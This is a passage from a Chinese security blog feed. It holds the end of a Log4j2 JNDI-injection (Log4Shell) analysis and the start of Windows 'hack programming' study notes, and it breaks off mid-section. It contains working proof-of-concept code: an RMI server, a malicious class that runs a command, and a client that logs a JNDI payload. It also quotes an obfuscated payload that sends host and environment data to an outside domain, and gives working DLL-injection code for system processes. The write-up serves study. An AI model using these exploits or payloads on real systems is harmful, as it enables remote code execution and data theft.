javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 准备好RMI服务端，等待受害服务器访问</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 本地主机上的远程对象注册表Registry的实例,默认端口1099</span></span><br><span class="line">            LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">            Registry registry = LocateRegistry.getRegistry();</span><br><span class="line">            System.out.println(<span class="string">&quot;Create RMI registry on port 1099&quot;</span>);</span><br><span class="line">            <span class="comment">//返回的Java对象</span></span><br><span class="line">            Reference reference = <span class="keyword">new</span> Reference(<span class="string">&quot;EvilCode&quot;</span>,<span class="string">&quot;EvilCode&quot;</span>,<span class="keyword">null</span>);</span><br><span class="line">            ReferenceWrapper referenceWrapper = <span class="keyword">new</span> ReferenceWrapper(reference);</span><br><span class="line">            <span class="comment">// 把远程对象注册到RMI注册服务器上，并命名为evil</span></span><br><span class="line">            registry.bind(<span class="string">&quot;evil&quot;</span>,referenceWrapper);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>恶意类，我们如果去创建一个EvilCode对象，也就是new EvilCode()，就会弹出计算器，就相当于构造函数了，一旦创建，就会执行。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 执行任意的脚本，目前的脚本会使windows服务器打开计算器</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EvilCode</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;受害服务器将执行下面命令行&quot;</span>);</span><br><span class="line">        Process p;</span><br><span class="line"></span><br><span class="line">        String[] cmd = &#123;<span class="string">&quot;calc&quot;</span>&#125;;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            p = Runtime.getRuntime().exec(cmd);</span><br><span class="line">            InputStream fis = p.getInputStream();</span><br><span class="line">            InputStreamReader isr = <span class="keyword">new</span> InputStreamReader(fis);</span><br><span class="line">            BufferedReader br = <span class="keyword">new</span> BufferedReader(isr);</span><br><span class="line">            String line = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">while</span>((line=br.readLine())!=<span class="keyword">null</span>) &#123;</span><br><span class="line">                System.out.println(line);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>客户端，log4j2的日志记录引发漏洞。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">log4j</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger logger = LogManager.getLogger(log4j.class);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//有些高版本jdk需要打开此行代码</span></span><br><span class="line">        System.setProperty(<span class="string">&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;</span>,<span class="string">&quot;true&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//模拟填写数据,输入构造好的字符串,使受害服务器打印日志时执行远程的代码 同一台可以使用127.0.0.1</span></span><br><span class="line">        String username = <span class="string">&quot;$&#123;jndi:rmi://127.0.0.1:1099/evil&#125;&quot;</span>;</span><br><span class="line">        <span class="comment">//正常打印业务日志</span></span><br><span class="line">        logger.error(<span class="string">&quot;username:&#123;&#125;&quot;</span>,username);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="调试过程"><a href="#调试过程" class="headerlink" title="调试过程"></a>调试过程</h3><p>先运行RMIServer，启动攻击服务，然后调试log4j。</p><h4 id="context-lookup"><a href="#context-lookup" class="headerlink" title="context.lookup"></a>context.lookup</h4><p>logger.error()f7步入后，经过调试很长一段，找到了匹配${}的地方。</p><p>主要是这里的toText()<br><img src="https://s2.loli.net/2022/02/18/3EVmUILnJ9WYaCA.png"><br>跟进toText()，跟到toSerializable()，会发现个for循环，其实是在看属于什么事件，是debug还是error，当i=8时，也就是我们这个样本使用的，即logger.error()。<br><img src="https://s2.loli.net/2022/02/18/FDC3x7Es2A8gKXL.png"><br>当i=8的时候步入，然后步入fomat，发现在匹配${，然后返回去掉${}的playload。<br><img src="https://s2.loli.net/2022/02/18/rac9I7UxRGC8JOE.png"><br>接下来步入replace()，然后跟到substitute()的this.resolveVariable(event, varName, buf, startPos, pos);<br><img src="https://s2.loli.net/2022/02/18/7RQh86TP4yY9GAc.png"><br>在调试几步就到了log4j2的lookup方法，这部分会根据字符‘:’的前面部分字符串从strLookupMap中判断是什么lookup，然后调用对应的Lookup方法。<br><img src="https://s2.loli.net/2022/02/19/tdR6u34sLMHANbY.png"><br>接下来调试JndiLookup()，return var6的时候f7步入，可以发现实际上是调用了this.context.lookup(name);<br><img src="https://s2.loli.net/2022/02/19/QYkTUa2jsJlc1Ey.png"></p><p>补充一点，上面的srtlookup包含“:-”分割jndi的方式，所以能看到<code>$&#123;$&#123;::-j&#125;$&#123;::-n&#125;$&#123;::-d&#125;$&#123;::-i&#125;:$&#123;::-l&#125;$&#123;::-d&#125;$&#123;::-a&#125;$&#123;::-p&#125;://$&#123;hostName&#125;.$&#123;env:COMPUTERNAME&#125;.$&#123;env:USERDOMAIN&#125;.$&#123;env&#125;.nsvi5sh112ksf1bp1ff2hvztn.l4j.zsec.uk</code>的一些playload，是因为::- 前面的数据会直接丢弃。<br>原文链接：<a href="https://blog.csdn.net/qq_42322144/article/details/121922084">https://blog.csdn.net/qq_42322144/article/details/121922084</a><br>reference：<a href="http://www.ch4ser.top/2021/12/11/log4j2-jndi/">http://www.ch4ser.top/2021/12/11/log4j2-jndi/</a></p><h4 id="jndi注入"><a href="#jndi注入" class="headerlink" title="jndi注入"></a>jndi注入</h4><p>下面的过程就是jndi注入的过程了。</p><p>这里需要强制步入this.context.lookup(name);，先是会进入getURLOrDefaultInitCtx()，这一步呢主要就是为给定的 URL 方案 ID 创建一个上下文，这个方案id就是getURLScheme返回的字符，也就是rmi或者ldap等，<a href="https://docs.oracle.com/en/java/javase/11/docs/api//java.naming/javax/naming/spi/NamingManager.html#getURLContext(java.lang.String,java.util.Hashtable)">getURLContext()官方文档</a>，主要感觉就是返回对应的类型，以便后面确定对应的方法函数。<br><img src="https://s2.loli.net/2022/02/19/QSlX9VAwu2me3Mn.png"><br>继续跟进，会发现又调用一个lookup的实现方法。<br><img src="https://s2.loli.net/2022/02/19/dWznPfsXZ1QuxKa.png"><br>跟进getRootURLContext会发现，其实这个函数就是在解析我们的upl，ip和端口以及未能解析的部分，并返回一个ResolveResult的类来表示名称解析的结果。<a href="https://www.runoob.com/manual/jdk1.6/java.naming/javax/naming/spi/ResolveResult.html">Class ResolveResult</a><br><img src="https://s2.loli.net/2022/02/19/W5BkHqcQeY2ZM38.png"><br>函数返回后我们看var2，可以发现    remainingName=”evil”，也就是未能解析的部分。</p><p>接着会调用getResolvedObj来检索解析成功的对象，也就是ip和port给到var3。</p><p>紧接着，又会将var2作为某个lookup的方法的参数，执行lookup函数，跟进这个lookup函数，发现又将会调用一个lookup方法，并且在最后解密一个对象。<br><img src="https://s2.loli.net/2022/02/19/vKSL69nkTfmYCZs.png"><br>跟进RegistryImpl_Stub()的lookup，这里好像调试不了，但是通过官方文档可以知道，这是在返回绑定到此注册表中指定的远程引用，也就是我们在攻击服务端注册的远程对象。<a href="https://docs.oracle.com/javase/7/docs/api/java/rmi/registry/Registry.html">java.rmi.registry</a><br><img src="https://s2.loli.net/2022/02/19/wMlV3FJAu4q5npx.png"><br>接下来跟进decodeObject(var2, var1.getPrefix(1))</p><p>f7步入，跟到这个地方会发现，所以getReference就是在获取我们之前用Reference包装的那个恶意类，并返回给了var3。<br><img src="https://s2.loli.net/2022/02/19/hKpykPnsrzEt7fa.png"><br>紧接着，调用getObjectInstance()，使用位置或引用信息以及指定的属性创建对象，<a href="https://www.runoob.com/manual/jdk11api/java.naming/javax/naming/spi/DirObjectFactory.html#getObjectInstance(java.lang.Object,javax.naming.Name,javax.naming.Context,java.util.Hashtable,javax.naming.directory.Attributes)">getObjectInstance</a>。<br><img src="https://s2.loli.net/2022/02/19/fdg7EsSyYPelhIv.png"></p><p>跟进getObjectInstance看看，究竟是如何执行的。</p><p>这里我们先了解一个名词Codebase：简单说，codebase就是远程装载类的路径。当对象发送者序列化对象时，会在序列化流中附加上codebase的信息。 这个信息告诉接收方到什么地方寻找该对象的执行代码。<a href="https://blog.csdn.net/bigtree_3721/article/details/50614289">https://blog.csdn.net/bigtree_3721/article/details/50614289</a></p><p>然后再看看ObjectFactory，<a href="https://www.runoob.com/manual/jdk11api/java.naming/javax/naming/spi/ObjectFactory.html">https://www.runoob.com/manual/jdk11api/java.naming/javax/naming/spi/ObjectFactory.html</a></p><p><img src="https://s2.loli.net/2022/02/19/txKjhgvEPZJY2dW.png"><br>然后跟进这个函数，会发现有个loadclass函数。<br><img src="https://s2.loli.net/2022/02/19/6Cx8SBYIRQvelMW.png"><br>最后如果一步步跟loadclass就会发现代码将跑到我们的恶意类那里去。</p><p>reference：<a href="https://www.cnblogs.com/yyhuni/p/15083613.html">jndi注入调试</a></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个漏洞其实主要还是jndi注入，Log4j2只是恰好提供了jndi的lookup，漏洞分析过程中也是查询和借鉴了大量的文章，也算是学到了很多。</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cve </tag>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows-Hack-Programming</title>
      <link href="2022/01/31/Windows-Hack-Programming/"/>
      <url>2022/01/31/Windows-Hack-Programming/</url>
      
        <content type="html"><![CDATA[<h1 id="Windows-Hack-Programming"><a href="#Windows-Hack-Programming" class="headerlink" title="Windows-Hack-Programming"></a>Windows-Hack-Programming</h1><p>本文章记录windows常见黑客编程技术，实际上都是比较老的了，新的也不可能发出来，之前也是分析恶意代码实践的lab，只能中ida的伪代码中学到一些知识点，比较零散，也没有参考代码，现在买了本《windows黑客编程技术基础》来系统学习学习。</p><h2 id="关于vs的一些小操作"><a href="#关于vs的一些小操作" class="headerlink" title="关于vs的一些小操作"></a>关于vs的一些小操作</h2><p>主要是属性的设置。</p><ul><li>字符集的设置。</li><li>优化</li><li>编译的exe能在其他电脑上打开<a href="https://blog.csdn.net/u014493318/article/details/60875012">https://blog.csdn.net/u014493318/article/details/60875012</a>，主要就是运行库的问题。</li><li>数据执行保护(DEP)</li><li>随机基地关闭</li><li>#pragma warning(disable:4996)，能直接使用strcmp等函数。</li></ul><p>查阅官方文档没有的函数<a href="http://undoc.airesoft.co.uk/">http://undoc.airesoft.co.uk/</a></p><h2 id="第二章-基础技术"><a href="#第二章-基础技术" class="headerlink" title="第二章-基础技术"></a>第二章-基础技术</h2><h3 id="运行单一实例"><a href="#运行单一实例" class="headerlink" title="运行单一实例"></a>运行单一实例</h3><p>有时候，病毒木马为了被靶机激活，一般都会选择植入到靶机的多个位置等，但是多了就容易暴露，所以有没有方法可以实现同一时间只让一个进程执行我们的恶意代码呢。互斥对象就可以做到这个，当然方法也不唯一，启动进程参数也可以做到这点，比如说彩虹猫的两种main参数。</p><p>原理主要是利用CreateMutex的返回值特性完成的。</p><pre><code>返回值如果函数成功，则返回值是新创建的互斥对象的句柄。如果函数失败，则返回值为NULL。要获取扩展的错误信息，请调用GetLastError。如果互斥锁是一个命名互斥锁并且该对象在此函数调用之前存在，则返回值是现有对象的句柄，并且GetLastError函数返回ERROR_ALREADY_EXISTS。</code></pre><p>互斥对象也在win32的学习中也学过的，下面直接上代码。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HANDLE hMutex;</span><br><span class="line">hMutex=CreateMutex(<span class="literal">NULL</span>, TRUE, <span class="string">L&quot;myMtex&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (hMutex)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (ERROR_ALREADY_EXISTS == GetLastError())</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Already Run!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Not Run!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;CreateMutex Failed&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="DLL延迟加载"><a href="#DLL延迟加载" class="headerlink" title="DLL延迟加载"></a>DLL延迟加载</h3><p>设置下vs就可实现，属性-&gt;链接器-&gt;输入-&gt;延迟加载的DLL-&gt;输入:SkinPPWTL.dll</p><h3 id="资源释放"><a href="#资源释放" class="headerlink" title="资源释放"></a>资源释放</h3><p>就是把各种资源放到exe文件里面，这样程序可以就只有一个，但是可以包含很多其他文件，当然大小也会变大。在《恶代》一书中的lab3-3就有这样的技术。</p><p>自闭了，写出来一直findresource错误，但是生成的exe明明包含了这个资源。。</p><h2 id="第三章-注入技术"><a href="#第三章-注入技术" class="headerlink" title="第三章-注入技术"></a>第三章-注入技术</h2><p>dll注入的技术，已经总结了一篇文章，现在只写写当时没总结到的。</p><h3 id="突破SEESION-0-隔离的远线程注入"><a href="#突破SEESION-0-隔离的远线程注入" class="headerlink" title="突破SEESION 0 隔离的远线程注入"></a>突破SEESION 0 隔离的远线程注入</h3><p>这个也就是CreateRemoteThread的底层函数ZwCreateThreadEx，CreateRemoteThread的本质是调用ZwCreateThreadEx，也是很久前那些大师傅调试CreateRemoteThread函数，最后找到了为什么不能注入SEESION 0进程的原因，就是ZwCreateThreadEx的第七个参数CreateThreadFlags如果为1的话，就会造成注入失败，所以想要向系统进程注入dll文件，就必须设置这个参数为0。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//64位系统下</span></span><br><span class="line">    DWORD WINAPI ZwCreateThreadEx)(</span><br><span class="line">        PHANDLE ThreadHandle,</span><br><span class="line">        ACCESS_MASK DesiredAccess,</span><br><span class="line">        LPVOID ObjectAttributes,</span><br><span class="line">        HANDLE ProcessHandle,</span><br><span class="line">        LPTHREAD_START_ROUTINE lpStartAddress,</span><br><span class="line">        LPVOID lpParameter,</span><br><span class="line">        ULONG CreateThreadFlags,</span><br><span class="line">        SIZE_T ZeroBits,</span><br><span class="line">        SIZE_T StackSize,</span><br><span class="line">        SIZE_T MaximumStackSize,</span><br><span class="line">        LPVOID pUnkown</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line"><span class="comment">//32位系统下</span></span><br><span class="line">    DWORD WINAPI ZwCreateThreadEx)(</span><br><span class="line">        PHANDLE ThreadHandle,</span><br><span class="line">        ACCESS_MASK DesiredAccess,</span><br><span class="line">        LPVOID ObjectAttributes,</span><br><span class="line">        HANDLE ProcessHandle,</span><br><span class="line">        LPTHREAD_START_ROUTINE lpStartAddress,</span><br><span class="line">        LPVOID lpParameter,</span><br><span class="line">        BOOL CreateSuspended,</span><br><span class="line">        DWORD dwStackSize,</span><br><span class="line">        DWORD dw1,</span><br><span class="line">        DWORD dw2,</span><br><span class="line">        LPVOID pUnkown</span><br><span class="line">        );</span><br></pre></td></tr></table></figure><p>ZwCreateThreadEx和NtCreateThreadEx好像是一样的。用户模式下是一样的。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">MyInjectDll</span><span class="params">(DWORD dwPID, LPCSTR szDllPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(WINAPI* ZWCREATETHREADEX)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">        PHANDLE ThreadHandle,</span></span></span><br><span class="line"><span class="function"><span class="params">        ACCESS_MASK DesiredAccess,</span></span></span><br><span class="line"><span class="function"><span class="params">        LPVOID ObjectAttributes,</span></span></span><br><span class="line"><span class="function"><span class="params">        HANDLE ProcessHandle,</span></span></span><br><span class="line"><span class="function"><span class="params">        LPTHREAD_START_ROUTINE lpStartAddress,</span></span></span><br><span class="line"><span class="function"><span class="params">        LPVOID lpParameter,</span></span></span><br><span class="line"><span class="function"><span class="params">        BOOL CreateSuspended,</span></span></span><br><span class="line"><span class="function"><span class="params">        DWORD dwStackSize,</span></span></span><br><span class="line"><span class="function"><span class="params">        DWORD dw1,</span></span></span><br><span class="line"><span class="function"><span class="params">        DWORD dw2,</span></span></span><br><span class="line"><span class="function"><span class="params">        LPVOID pUnkown</span></span></span><br><span class="line"><span class="function"><span class="params">        )</span></span>;</span><br><span class="line"></span><br><span class="line">HANDLE hProcess = <span class="literal">NULL</span>, hThread = <span class="literal">NULL</span>;<span class="comment">//目标进程的句柄 </span></span><br><span class="line">    LPVOID pRemoteBuf = <span class="literal">NULL</span>;</span><br><span class="line">    DWORD dwBufSize = (DWORD)<span class="built_in">strlen</span>(szDllPath) + <span class="number">1</span>;</span><br><span class="line">    HMODULE hMod = <span class="literal">NULL</span>;</span><br><span class="line">    HMODULE hNtdllDll = <span class="literal">NULL</span>;</span><br><span class="line">    LPTHREAD_START_ROUTINE pThreadProc;</span><br><span class="line">    ZWCREATETHREADEX MyZwCreateThreadEx;</span><br><span class="line">    DWORD bzwCT;</span><br><span class="line"></span><br><span class="line">    HANDLE hRemoteThread = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;OpenProcess failed!!!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//申请dll路径大小的空间</span></span><br><span class="line">    pRemoteBuf = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, dwBufSize, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == pRemoteBuf)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;VirtualAllocEx failed!!!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//写入dll路径</span></span><br><span class="line">    <span class="keyword">if</span> (FALSE == WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)szDllPath, dwBufSize, <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;WriteProcessMemory failed!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    hMod = GetModuleHandle(<span class="string">L&quot;kernel32.dll&quot;</span>);</span><br><span class="line">    hNtdllDll = GetModuleHandleA(<span class="string">&quot;ntdll.dll&quot;</span>);</span><br><span class="line">    pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(hMod, <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line"></span><br><span class="line">    MyZwCreateThreadEx = (ZWCREATETHREADEX)GetProcAddress(hNtdllDll, <span class="string">&quot;ZwCreateThreadEx&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (pThreadProc == <span class="literal">NULL</span> || MyZwCreateThreadEx == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;GetProcAddress failed!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    bzwCT=MyZwCreateThreadEx(&amp;hRemoteThread, PROCESS_ALL_ACCESS, <span class="literal">NULL</span>, hProcess, (LPTHREAD_START_ROUTINE)pThreadProc, pRemoteBuf, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hRemoteThread == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ZwCreateThreadEx failed!!! %d&quot;</span>,GetLastError());</span><br><span class="line">    &#125;</span><br><span class="line">    CloseHandle(hProcess);</span><br><span class="line">    FreeLibrary(hMod);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DWORD dwPID = <span class="number">15644</span>;</span><br><span class="line">    LPCSTR szDllPath = <span class="string">&quot;d://myhack3.dll&quot;</span>;</span><br><span class="line">    MyInjectDll(dwPID, szDllPath);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实际上很多系统进程还是没法注入。</p><h3 id="APC注入"><a href="#APC注入" class="headerlink" title="APC注入"></a>APC注入</h3><p>新知识点，先了解APC的概念。</p><p>APC(Asynchronous Procedure)：异步过程调用，指函数在特定线程中被异步执行，看到这，我又产生了疑惑，什么是异步执行。</p><pre><code>同步：所谓同步，就是发出一个功能调用时，在没有得到结果之前，该调用就不返回或继续执行后续操作。简单来说，同步就是必须一件一件事做，等前一件做完了才能做下一件事。例如：B/S模式中的表单提交，具体过程是：客户端提交请求-&gt;等待服务器处理-&gt;处理完毕返回，在这个过程中客户端（浏览器）不能做其他事。异步：异步与同步相对，当一个异步过程调用发出后，调用者在没有得到结果之前，就可以继续执行后续操作。当这个调用完成后，一般通过状态、通知和回调来通知调用者。对于异步调用，调用的返回并不受调用者控制。对于通知调用者的三种方式，具体如下：状态：即监听被调用者的状态（轮询），调用者需要每隔一定时间检查一次，效率会很低。通知：当被调用者执行完成后，发出通知告知调用者，无需消耗太多性能。回调：与通知类似，当被调用者执行完成后，会调用调用者提供的回调函数。例如：B/S模式中的ajax请求，具体过程是：客户端发出ajax请求-&gt;服务端处理-&gt;处理完毕执行客户端回调，在客户端（浏览器）发出请求后，仍然可以做其他的事。</code></pre><p>每个线程都有一个APC队列，而QueueUserAPC函数可以可以向APC队列插入函数，先进先出，而且插入后，函数不会立即执行，除非函数处于通知(警告)状态，当线程在内部使用SignalObjectAndWait，SleepEx,WaitForSingleObjectEX，WaitForMultipleObjectsEX，等函数把自己挂起就处于了警告状态，就会执行APC队列里面的函数。</p><p>也是对APC有了个初步的了解，而QueueUserAPC这个函数更是有和CreateRemoteThread相似的特性。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 